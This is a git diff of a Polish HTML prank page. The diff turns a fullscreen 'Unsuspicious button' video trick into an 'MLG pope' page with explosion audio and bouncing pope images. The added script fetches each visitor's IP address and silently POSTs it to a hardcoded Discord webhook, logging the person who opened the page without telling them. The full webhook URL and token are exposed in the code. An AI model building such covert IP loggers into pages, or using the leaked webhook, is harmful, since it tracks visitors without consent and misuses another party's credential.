@@ -1,89 +1,231 @@
+<!DOCTYPE html>
+<html lang="pl">
 <head>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  <script type="importmap">
-    {
-      "imports": {
-        "@material/web/": "https://esm.run/@material/web/"
-      }
-    }
-  </script>
-  <script type="module">
-    import '@material/web/all.js';
-    import {styles as typescaleStyles} from '@material/web/typography/md-typescale-styles.js';
-    document.adoptedStyleSheets.push(typescaleStyles.styleSheet);
-  </script>
-  <style>
-    html, body {
-      margin: 0;
-      height: 100%;
-      width: 100%;
-      font-family: 'Roboto', sans-serif;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+<meta charset="UTF-8">
+<title>Papież MLG</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<script type="importmap">
+{
+  "imports": {
+    "@material/web/": "https://esm.run/@material/web/"
+  }
+}
+</script>
+<script type="module">
+import '@material/web/all.js';
+import {styles as typescaleStyles} from '@material/web/typography/md-typescale-styles.js';
+document.adoptedStyleSheets.push(typescaleStyles.styleSheet);
+</script>
+<style>
+html, body {
+  margin: 0;
+  height: 100%;
+  width: 100%;
+  font-family: 'Roboto', sans-serif;
+  overflow: hidden;
+  background: black;
+}
 
-    /* Background video */
-    #bgVideo {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: 0;
-    }
+#bgVideo {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover; 
+  z-index: 0;
+}
 
-    /* Centered button */
-    md-filled-button {
-      font-size: 24px;
-      padding: 20px 40px;
-      border-radius: 12px;
-      --md-sys-color-primary: #1e88e5;
-      --md-sys-color-on-primary: #ffffff;
-      cursor: pointer;
-      z-index: 2;
-      position: relative;
-    }
-  </style>
+#startContainer {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  z-index: 10;
+}
+
+md-filled-button {
+  font-size: 32px;
+  padding: 30px 60px;
+  border-radius: 16px;
+  transition: background 0.5s, color 0.5s;
+  cursor: pointer;
+}
+
+#overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;    
+  height: 100vh;   
+  color: #0f0; /* zielony tekst */
+  display: none;
+  flex-direction: column;
+  justify-content: flex-start;
+  align-items: center;
+  font-size: 1.5em;
+  z-index: 20;
+  padding-top: 20px;
+  background: black; /* całkowicie czarny overlay */
+  font-family: 'Roboto', sans-serif; /* Material 3 font */
+}
+
+#overlay h1 {
+  text-align: center;
+}
+
+#overlay h2 {
+  font-size: 3em; /* większe IP */
+  font-family: 'Roboto', sans-serif;
+  color: #0f0;
+  text-align: center;
+}
+
+.mlgPope {
+  position: fixed;
+  width: 150px;
+  height: auto;
+  z-index: 25;
+  display: none;
+  pointer-events: none;
+}
+</style>
 </head>
 <body>
-  <!-- Background video -->
-  <video id="bgVideo" autoplay muted loop>
-    <source src="https://i.imgur.com/OFXbVaM.mp4" type="video/mp4">
-  </video>
 
-  <!-- Centered button -->
-  <md-filled-button onclick="playRickroll()">"Unsuspicious button"</md-filled-button>
+<video id="bgVideo" autoplay muted loop>
+  <source src="https://i.imgur.com/OFXbVaM.mp4" type="video/mp4">
+</video>
 
-  <script>
-    async function playRickroll() {
-      // Fullscreen browser
-      if (!document.fullscreenElement) {
-        try {
-          await document.documentElement.requestFullscreen();
-        } catch (err) {
-          console.log("Fullscreen request failed:", err);
+<div id="startContainer">
+  <md-filled-button id="startButton" onclick="start()">Kliknij mnie</md-filled-button>
+</div>
+
+<div id="overlay">
+  <h1>Twój adres IP to:</h1>
+  <h2 id="ip">Ładowanie...</h2>
+</div>
+
+<!-- Papieże -->
+<img class="mlgPope" src="https://i.imgur.com/yoobKqz.jpeg">
+<img class="mlgPope" src="https://i.imgur.com/yoobKqz.jpeg">
+<img class="mlgPope" src="https://i.imgur.com/yoobKqz.jpeg">
+<img class="mlgPope" src="https://i.imgur.com/yoobKqz.jpeg">
+
+<script>
+const button = document.getElementById('startButton');
+
+// Animacja RGB (Material You style)
+let hue = 0;
+function animateButtonTheme() {
+  hue = (hue + 1) % 360;
+  const primary = `hsl(${hue}, 80%, 50%)`;
+  const onPrimary = `hsl(${(hue+180)%360}, 80%, 95%)`;
+  button.style.setProperty('--md-sys-color-primary', primary);
+  button.style.setProperty('--md-sys-color-on-primary', onPrimary);
+  requestAnimationFrame(animateButtonTheme);
+}
+animateButtonTheme();
+
+async function start() {
+  document.getElementById('startContainer').style.display = 'none';
+  const overlay = document.getElementById('overlay');
+  overlay.style.display = 'flex';
+  const popeElements = Array.from(document.getElementsByClassName('mlgPope'));
+
+  if (!document.fullscreenElement) {
+    try { await document.documentElement.requestFullscreen(); } catch {}
+  }
+
+  // fetch IP
+  let userIP = "Nieznany";
+  try {
+    const response = await fetch("https://api.ipify.org?format=json");
+    const data = await response.json();
+    userIP = data.ip;
+    document.getElementById('ip').textContent = userIP;
+  } catch {
+    document.getElementById('ip').textContent = "Nie udało się pobrać IP 😿";
+  }
+
+  // Wyślij info do webhooka z IP
+  fetch('https://discord.com/api/webhooks/1376590311966375968/QFcC-pZrxoo_p_9Ppux4Ylw68jncL6ZHnCk4pKD-zjVPURmLQ2dQ-ai7TzqHDFGMH2gZ', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: "ktos to otworzyl xD IP: " + userIP })
+  }).catch(err => console.log("Webhook zablokowany / CORS?", err));
+
+  // Eksplozja
+  const explosionAudio = new Audio('https://raw.githubusercontent.com/furasekfilip/furasekfilip.github.io/refs/heads/main/deltarune-explosion.mp3');
+  explosionAudio.volume = 0.5;
+  explosionAudio.play().catch(()=>console.log("Autoplay zablokowany"));
+
+  // Muzyka papieża
+  const danceAudio = new Audio('https://raw.githubusercontent.com/furasekfilip/furasekfilip.github.io/refs/heads/main/Wapiesz%20-%20hehe%20papież%20ta%C5%84czy-%5BAudioTrimmer.com%5D.mp3');
+  danceAudio.volume = 0.5;
+
+  explosionAudio.addEventListener('loadedmetadata', () => {
+    const delay = Math.max(0, (explosionAudio.duration - 1.5) * 1000);
+    setTimeout(() => danceAudio.play().catch(()=>console.log("Autoplay zablokowany")), delay);
+  });
+
+  explosionAudio.addEventListener('ended', () => {
+    startPopeDVD(popeElements);
+  });
+}
+
+function startPopeDVD(popeElements) {
+  const popes = popeElements.map(pope => {
+    pope.style.display = 'block';
+    return {
+      el: pope,
+      x: Math.random() * (window.innerWidth - pope.width),
+      y: Math.random() * (window.innerHeight - pope.height),
+      dx: (Math.random() * 4 + 2) * (Math.random() < 0.5 ? -1 : 1),
+      dy: (Math.random() * 4 + 2) * (Math.random() < 0.5 ? -1 : 1),
+      width: 150,
+      height: pope.height
+    };
+  });
+
+  function step() {
+    for (let i = 0; i < popes.length; i++) {
+      let p = popes[i];
+      p.x += p.dx;
+      p.y += p.dy;
+
+      if (p.x < 0 || p.x > window.innerWidth - p.width) p.dx *= -1;
+      if (p.y < 0 || p.y > window.innerHeight - p.height) p.dy *= -1;
+
+      for (let j = i+1; j < popes.length; j++) {
+        let q = popes[j];
+        if (p.x < q.x + q.width &&
+            p.x + p.width > q.x &&
+            p.y < q.y + q.height &&
+            p.y + p.height > q.y) {
+          let tempDx = p.dx;
+          let tempDy = p.dy;
+          p.dx = q.dx;
+          p.dy = q.dy;
+          q.dx = tempDx;
+          q.dy = tempDy;
+
+          p.x += p.dx;
+          p.y += p.dy;
+          q.x += q.dx;
+          q.y += q.dy;
         }
       }
 
-      // Create overlay video dynamically
-      const overlay = document.createElement('video');
-      overlay.src = "https://i.imgur.com/jpLPqmt.mp4";
-      overlay.loop = true;
-      overlay.muted = false; // play sound
-      overlay.autoplay = true;
-      overlay.style.position = "fixed";
-      overlay.style.top = "0";
-      overlay.style.left = "0";
-      overlay.style.width = "100vw";
-      overlay.style.height = "100vh";
-      overlay.style.zIndex = "9999";
-
-      // Add to body and play
-      document.body.appendChild(overlay);
-      overlay.play();
+      p.el.style.left = p.x + 'px';
+      p.el.style.top = p.y + 'px';
     }
-  </script>
+    requestAnimationFrame(step);
+  }
+
+  requestAnimationFrame(step);
+}
+</script>
+
 </body>
+</html>
